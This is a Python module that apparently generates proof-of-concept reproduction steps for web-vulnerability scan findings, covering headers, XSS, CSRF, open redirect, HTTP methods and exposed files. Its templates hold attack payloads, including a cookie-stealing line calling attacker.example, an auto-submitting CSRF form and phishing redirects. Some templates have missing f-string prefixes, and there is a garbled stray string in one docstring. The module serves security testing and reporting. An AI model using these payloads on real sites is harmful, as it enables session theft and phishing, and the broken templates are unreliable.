"""
Proof-of-Concept (PoC) generation for each finding.

Produces step-by-step reproduction instructions written like a real bug-bounty hunter:
  - Exact tool commands / curl requests
  - Expected responses / indicators of vulnerability
  - Impact statement
  - Suggested payload or verification test

These steps are deterministic fallbacks; the AI enrichment layer may override them
with more contextualised content when an AI provider is available.
"""
from __future__ import annotations

from typing import Any
from urllib.parse import urlparse


# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------

def _endpoint(finding: dict[str, Any]) -> str:
    return finding.get("endpoint") or finding.get("target") or "https://target.example.com"


def _host(finding: dict[str, Any]) -> str:
    ep = _endpoint(finding)
    parsed = urlparse(ep)
    return parsed.hostname or ep


# ---------------------------------------------------------------------------
# Per-finding-type PoC builders
# ---------------------------------------------------------------------------

_POC_BUILDERS: list[tuple[list[str], Any]] = []


def _register(*keywords):
    """Decorator to register a PoC builder for certain title/tool keywords."""
    def decorator(fn):
        _POC_BUILDERS.append((list(keywords), fn))
        return fn
    return decorator


@_register("missing hsts", "strict-transport-security")
def _poc_hsts(f: dict) -> str:
    ep = _endpoint(f)
    return (
        "**Proof of Concept — Missing HSTS Header**\n\n"
        f"**Step 1 — Reproduce:**\n```bash\ncurl -sI {ep} | grep -i strict\n```\n"
        "**Expected result:** No `Strict-Transport-Security` header in the response.\n\n"
        "**Step 2 — Confirm impact:**\n"
        "Open browser DevTools → Network tab → inspect the response headers for the root page.\n"
        "Absence of HSTS means a browser connecting over HTTP will not be automatically upgraded,\n"
        "enabling a downgrade/MITM attack on first-visit users.\n\n"
        "**Step 3 — Payload (MITM simulation):**\n"
        "Use `mitmproxy` or `sslstrip` on the same network to confirm traffic can be intercepted.\n\n"
        "**Step 4 — Remediation check:**\n"
        f"After fix, re-run: `curl -sI {ep} | grep -i strict`\n"
        "Should return: `strict-transport-security: max-age=31536000; includeSubDomains`"
    )


@_register("missing content-security-policy", "content-security-policy")
def _poc_csp(f: dict) -> str:
    ep = _endpoint(f)
    return (
        "**Proof of Concept — Missing Content-Security-Policy**\n\n"
        f"**Step 1 — Reproduce:**\n```bash\ncurl -sI {ep} | grep -i content-security\n```\n"
        "**Expected result:** No `Content-Security-Policy` header in the response.\n\n"
        "**Step 2 — XSS test (non-destructive):**\n"
        "Inject a benign script reflection payload in URL parameters or form fields:\n"
        "```\n?q=<img src=x onerror=console.log('xss')>\n```\n"
        "If the page reflects the input without sanitisation and no CSP blocks script,\n"
        "the payload executes — confirming exploitable XSS.\n\n"
        "**Step 3 — Impact:** An attacker can inject and execute arbitrary JavaScript,\n"
        "steal session cookies, redirect users, or perform account takeover.\n\n"
        "**Step 4 — Remediation check:**\n"
        f"`curl -sI {ep} | grep -i content-security`\n"
        "Should return a restrictive policy, e.g.:\n"
        "`content-security-policy: default-src 'self'; script-src 'self'`"
    )


@_register("missing x-frame-options", "clickjacking", "x-frame-options")
def _poc_xframe(f: dict) -> str:
    ep = _endpoint(f)
    return (
        "**Proof of Concept — Missing X-Frame-Options (Clickjacking)**\n\n"
        f"**Step 1 — Reproduce:**\n```bash\ncurl -sI {ep} | grep -i x-frame\n```\n"
        "**Expected result:** No `X-Frame-Options` header.\n\n"
        "**Step 2 — Browser PoC:**\nCreate a local HTML file:\n"
        "```html\n<html>\n"
        "<body>\n"
        "  <h1>Clickjacking PoC</h1>\n"
        f"  <iframe src=\"{ep}\" style=\"opacity:0.1; position:absolute; width:800px; height:600px;\"></iframe>\n"
        "  <button style=\"position:absolute; top:200px;\">Click me to win!</button>\n"
        "</body>\n</html>\n```\n"
        "Open in browser — the target page loads inside the iframe, confirming the vulnerability.\n\n"
        "**Step 3 — Impact:** Attacker overlays a transparent target page over a decoy,\n"
        "tricking users into clicking target UI actions (e.g. account deletion, payment approval).\n\n"
        "**Step 4 — Remediation check:**\n"
        f"`curl -sI {ep} | grep -i x-frame`\nExpected: `x-frame-options: DENY`"
    )


@_register("cookie flags", "session cookie", "httponly", "secure")
def _poc_cookie(f: dict) -> str:
    ep = _endpoint(f)
    return (
        "**Proof of Concept — Insecure Cookie Flags**\n\n"
        f"**Step 1 — Reproduce:**\n```bash\ncurl -sI {ep} | grep -i set-cookie\n```\n"
        "**Expected result:** `Set-Cookie` header missing `HttpOnly` or `Secure` flag.\n\n"
        "**Step 2 — JavaScript cookie theft (requires XSS):**\n"
        "In browser console or via injected script:\n"
        "```javascript\n// If HttpOnly is missing, JavaScript can read session cookie:\nconsole.log(document.cookie);\n```\n"
        "**Step 3 — Network interception (requires missing Secure flag):**\n"
        "On HTTP, the cookie is transmitted in plaintext — capture with Wireshark or mitmproxy.\n\n"
        "**Step 4 — Impact:** Session hijacking — an attacker who reads or intercepts the cookie\n"
        "can replay it to impersonate the victim user.\n\n"
        "**Step 5 — Remediation check:**\n"
        f"`curl -sI {ep} | grep -i set-cookie`\n"
        "Expected: `Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict`"
    )


@_register("does not enforce https", "http", "tls")
def _poc_https(f: dict) -> str:
    ep = _endpoint(f)
    host = _host(f)
    return (
        "**Proof of Concept — No HTTPS / Cleartext Transmission**\n\n"
        f"**Step 1 — Reproduce:**\n```bash\ncurl -sI http://{host}/ | head -5\n```\n"
        "**Expected result:** HTTP 200 (no redirect to HTTPS).\n\n"
        "**Step 2 — Packet capture:**\n"
        "```bash\nsudo tcpdump -i any -A 'host {host} and port 80' 2>/dev/null | head -40\n```\n"
        "Request/response bodies visible in plaintext — credentials, tokens, and PII exposed.\n\n"
        "**Step 3 — Impact:** Full session hijacking and credential theft over any shared network\n"
        "(coffee shop Wi-Fi, corporate proxy, ISP).\n\n"
        "**Step 4 — Remediation check:**\n"
        f"`curl -sI http://{host}/ | grep -i location`\n"
        "Expected: `location: https://{host}/`"
    )


@_register("open service port", "open port", "nmap")
def _poc_openport(f: dict) -> str:
    host = _host(f)
    evidence = f.get("evidence", "")
    port_hint = "80,443"
    for token in evidence.split():
        if "/tcp" in token:
            port_hint = token.split("/")[0]
            break
    return (
        "**Proof of Concept — Exposed Service Port**\n\n"
        f"**Step 1 — Reproduce:**\n```bash\nnmap -Pn -sV -p {port_hint} {host}\n```\n"
        f"**Expected result:** `{port_hint}/tcp open` with service banner visible.\n\n"
        "**Step 2 — Banner grab:**\n"
        f"```bash\ncurl -sI http://{host}:{port_hint}/ 2>/dev/null | head -10\n```\n"
        "Or for non-HTTP: `nc -v {host} {port_hint}`\n\n"
        "**Step 3 — Enumerate further:**\n"
        f"```bash\nnmap -sV --script=banner {host} -p {port_hint}\n```\n"
        "**Step 4 — Impact:** Each exposed service is an additional attack surface.\n"
        "Unpatched or misconfigured services can be directly exploited.\n\n"
        "**Step 5 — Remediation check:**\n"
        f"`nmap -Pn -p {port_hint} {host}` → port should show `closed` or `filtered`."
    )


@_register("server banner", "technology fingerprint", "version disclosure", "outdated component")
def _poc_fingerprint(f: dict) -> str:
    ep = _endpoint(f)
    return (
        "**Proof of Concept — Technology Fingerprinting / Version Disclosure**\n\n"
        f"**Step 1 — Reproduce:**\n```bash\ncurl -sI {ep} | grep -i server\nwhatWEB --color=never {ep}\n```\n"
        "**Expected result:** Server/version strings visible in response headers or body.\n\n"
        "**Step 2 — Cross-reference CVEs:**\n"
        "Take the exposed version string and search:\n"
        "```bash\nsearchsploit <software> <version>\n# or visit https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=<software>\n```\n"
        "**Step 3 — Confirm exploitability:**\nIf a public CVE matches the disclosed version,\n"
        "clone the PoC from ExploitDB or GitHub and test against a copy/lab instance first.\n\n"
        "**Step 4 — Impact:** Precise version knowledge allows targeted exploitation of known CVEs\n"
        "without blind brute-forcing, significantly reducing attacker effort.\n\n"
        "**Step 5 — Remediation check:**\n"
        f"`curl -sI {ep} | grep -i server` → should return no version string,\n"
        "or at most a generic `nginx` / `Apache` without version."
    )


@_register("risky http methods", "trace", "put", "delete")
def _poc_httpmethods(f: dict) -> str:
    ep = _endpoint(f)
    return (
        "**Proof of Concept — Risky HTTP Methods Enabled**\n\n"
        f"**Step 1 — Reproduce:**\n```bash\nnmap --script http-methods {_host(f)}\n# or:\ncurl -sX OPTIONS {ep} -D - | grep -i allow\n```\n"
        "**Expected result:** `Allow:` header lists TRACE, PUT, or DELETE.\n\n"
        "**Step 2 — TRACE reflection test:**\n"
        f"```bash\ncurl -sX TRACE {ep} -H 'X-Custom-Header: xss-test'\n```\n"
        "If response echoes the request including headers → **Cross-Site Tracing (XST)** confirmed.\n\n"
        "**Step 3 — PUT test (low-risk probe):**\n"
        f"```bash\ncurl -sX PUT {ep}/test.txt -d 'poc' -w '%{{http_code}}'\n```\n"
        "201 response confirms arbitrary file upload capability.\n\n"
        "**Step 4 — Impact:** TRACE enables XST attacks. PUT/DELETE can allow unauthenticated\n"
        "data modification or file upload leading to webshell deployment.\n\n"
        "**Step 5 — Remediation check:**\n"
        f"`curl -sX OPTIONS {ep} -D - | grep Allow` → should only list `GET, POST, HEAD`."
    )


@_register("no web application firewall", "no waf", "waf")
def _poc_nowaf(f: dict) -> str:
    ep = _endpoint(f)
    return (
        "**Proof of Concept — No WAF / Firewall Detection**\n\n"
        f"**Step 1 — Reproduce:**\n```bash\nwafw00f {ep}\n```\n"
        "**Expected result:** `No WAF detected`.\n\n"
        "**Step 2 — Probe with malicious-looking payloads (non-destructive):**\n"
        f"```bash\ncurl -sG {ep} --data-urlencode \"q=<script>alert(1)</script>\" -w '%{{http_code}}'\ncurl -sG {ep} --data-urlencode \"id=1 OR 1=1\" -w '%{{http_code}}'\n```\n"
        "If both return 200 without blocking, WAF is absent.\n\n"
        "**Step 3 — Impact:** Without a WAF, common attack payloads (XSS, SQLi, path traversal)\n"
        "reach the application backend unfiltered, increasing risk of successful exploitation.\n\n"
        "**Step 4 — Remediation check:**\n"
        "`wafw00f` should detect the configured WAF product after deployment."
)


@_register("reflected xss", "xss indicator", "unencoded input reflection", "xss-passive")
def _poc_xss_reflected(f: dict) -> str:
    ep = _endpoint(f)
    param = f.get("parameter") or "q"
    return (
        "**Proof of Concept — Reflected XSS (Unencoded Input Reflection)**\n\n"
        f"**Step 1 — Reproduce:**\n```bash\ncurl -sG {ep} --data-urlencode \"{param}=<script>alert(document.domain)</script>\" | grep -i script\n```\n"
        "**Expected result:** The `<script>` tag appears unencoded in the HTML response.\n\n"
        "**Step 2 — Browser PoC:**\n"
        f"Open in your browser:\n```\n{ep}?{param}=<img src=x onerror=alert(document.cookie)>\n```\n"
        "If an alert dialog fires, XSS is confirmed.\n\n"
        "**Step 3 — Session Hijacking demo (ethical lab only):**\n"
        "```javascript\n// Payload to exfiltrate session cookies:\nnew Image().src='https://attacker.example/steal?c='+document.cookie\n```\n\n"
        "**Step 4 — Impact:** Full session takeover, account hijacking, defacement, or malware delivery.\n\n"
        "**Step 5 — Remediation check:**\n"
        f"After fix, re-run: `curl -sG {ep} --data-urlencode \"{param}=xss_probe\" | grep -i xss_probe`\n"
        "Should return HTML-encoded output: `&lt;script&gt;` or the probe should not appear in the body at all."
    )


@_register("cross-site scripting", "xss", "dalfox", "confirmed by dalfox", "potential xss")
def _poc_xss_confirmed(f: dict) -> str:
    ep = _endpoint(f)
    evidence = f.get("evidence", "")
    return (
        "**Proof of Concept — Cross-Site Scripting (XSS) — Active Confirmation**\n\n"
        f"**Step 1 — Tool confirmation:**\n"
        f"Dalfox confirmed this finding during the scan.\n"
        f"Evidence:\n```\n{evidence[:500]}\n```\n\n"
        "**Step 2 — Manual browser PoC:**\n"
        f"Open in browser:\n```\n{ep}?q=<script>alert(document.domain)</script>\n```\n"
        "If an alert fires, XSS is live.\n\n"
        "**Step 3 — DOM XSS alternative test:**\n"
        f"`{ep}#<img/src/onerror=alert(1)>`\n\n"
        "**Step 4 — Impact:** Complete client-side compromise. Attackers can:\n"
        "- Steal session tokens → impersonate user\n"
        "- Redirect to phishing pages\n"
        "- Silently modify page content\n\n"
        "**Step 5 — Remediation check:**\n"
        "Apply HTML encoding on all reflected output, add a strict CSP header, re-run dalfox `url`."
    )


@_register("csrf", "cross-site request forgery", "missing anti-csrf", "samesite")
def _poc_csrf(f: dict) -> str:
    ep = _endpoint(f)
    return (
        "**Proof of Concept — Cross-Site Request Forgery (CSRF)**\n\n"
        f"**Step 1 — Reproduce:**\n```bash\ncurl -sI {ep} | grep -i set-cookie\n```\n"
        "Check if `SameSite` attribute is present.\n\n"
        "**Step 2 — Browser PoC (host on evil.example.com):**\n"
        "```html\n<html>\n<body>\n"
        f"  <form action=\"{ep}\" method=\"POST\" id=\"csrf\">\n"
        "    <input type=\"hidden\" name=\"action\" value=\"delete_account\">\n"
        "  </form>\n"
        "  <script>document.getElementById('csrf').submit();</script>\n"
        "</body>\n</html>\n```\n"
        "When a logged-in victim visits this page, the request fires automatically with their cookie.\n\n"
        "**Step 3 — Confirm no CSRF token:**\n"
        f"`curl -s {ep} | grep -i csrf` → should return empty if unprotected.\n\n"
        "**Step 4 — Impact:** Attacker can trigger any state-changing action (password reset, purchase, deletion) "
        "using the victim's authenticated session.\n\n"
        "**Step 5 — Remediation check:**\n"
        "After fix, confirm all POST forms have a hidden CSRF token input and cookies use `SameSite=Strict`."
    )


@_register("open redirect", "unvalidated redirect", "unvalidated external redirect")
def _poc_open_redirect(f: dict) -> str:
    ep = _endpoint(f)
    param = f.get("parameter") or "next"
    return (
        "**Proof of Concept — Open Redirect**\n\n"
        f"**Step 1 — Reproduce:**\n```bash\ncurl -sI \"{ep}?{param}=https://evil.example.com\" | grep -i location\n```\n"
        "**Expected result:** `Location: https://evil.example.com` in the response.\n\n"
        "**Step 2 — Browser PoC:**\n"
        f"Navigate to: `{ep}?{param}=https://google.com`\n"
        "If the browser lands on google.com, the redirect is unvalidated.\n\n"
        "**Step 3 — Phishing scenario:**\n"
        f"Attacker sends: `{ep}?{param}=https://attacker.com/fake-login`\n"
        "Victim sees the trusted domain in the link but is immediately redirected to a phishing page.\n\n"
        "**Step 4 — Impact:** Phishing, credential harvesting, OAuth token theft.\n\n"
        "**Step 5 — Remediation check:**\n"
        f"After fix: `curl -sI \"{ep}?{param}=https://evil.example.com\"` should NOT return an external Location header."
    )


@_register(
    "exposed .env", "exposed .git", "sensitive file", "exposure-check",
    "stack trace", "error disclosure", "phpinfo", "backup", "actuator", "debug endpoint",
    "swagger api spec"
)
def _poc_sensitive(f: dict) -> str:
    ep = _endpoint(f)
    title = f.get("title", "Sensitive file/endpoint")
    evidence_preview = (f.get("evidence") or "")[:300]
    return (
        f"**Proof of Concept — {title}**\n\n"
        f"**Step 1 — Reproduce:**\n```bash\ncurl -s {ep} | head -30\n```\n"
        "**Expected result:** HTTP 200 response with sensitive content visible.\n\n"
        f"**Step 2 — Confirm in browser:**\nNavigate to: `{ep}`\n"
        "If the file/page loads with real content, the exposure is confirmed.\n\n"
        "**Step 3 — Evidence captured:**\n"
        f"```\n{evidence_preview}\n```\n\n"
        "**Step 4 — Impact:** Depending on the file:\n"
        "- `.env` / config → Credential theft, full system compromise\n"
        "- `.git` → Complete source code extraction → find new vulns\n"
        "- Backup `.sql` → Full database dump including user PII and hashed passwords\n"
        "- Stack traces → Internal path/class disclosure aiding targeted attacks\n\n"
        "**Step 5 — Remediation check:**\n"
        f"`curl -sI {ep}` → Should return HTTP 403 or 404 after fix."
    )


# ---------------------------------------------------------------------------
# Generic fallback
# ---------------------------------------------------------------------------

def _poc_generic(f: dict) -> str:
    title = f.get("title", "this finding")
    ep = _endpoint(f)
    tool = f.get("tool_source", "the scanner")
    cwe = f.get("cwe_id") or "N/A"
    severity = (f.get("severity") or "info").upper()

    return (
        f"**Proof of Concept — {title}**\n\n"
        f"**Severity:** {severity} | **CWE:** {cwe}\n\n"
        f"**Step 1 — Reproduce with {tool}:**\n"
        f"Run the same {tool} check against `{ep}` and confirm the finding reappears in the output.\n\n"
        "**Step 2 — Manual verification:**\n"
        f"```bash\ncurl -sI {ep}\n# Inspect headers and response body for indicators matching the finding.\n```\n"
        "**Step 3 — Browser DevTools:**\n"
        "Open DevTools → Security / Network tab → confirm the issue is reproducible interactively.\n\n"
        "**Step 4 — Impact assessment:**\n"
        "Review the OWASP reference and CWE documentation to understand the full attack scenario.\n\n"
        "**Step 5 — Remediation check:**\n"
        f"Apply the recommended fix and re-run {tool} against `{ep}` to confirm the finding\n"
        "no longer appears in the scan output."
    )


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def generate_poc_steps(finding: dict[str, Any]) -> str:
    """Return structured, bug-bounty-style PoC steps for a finding."""  " after fingin itys value should be return and it should be gin f"
    title_lower = (finding.get("title") or "").lower()
    tool_lower = (finding.get("tool_source") or "").lower()
    search_text = f"{title_lower} {tool_lower}"

    for keywords, builder in _POC_BUILDERS:
        if any(kw in search_text for kw in keywords):
            return builder(finding)

    return _poc_generic(finding)
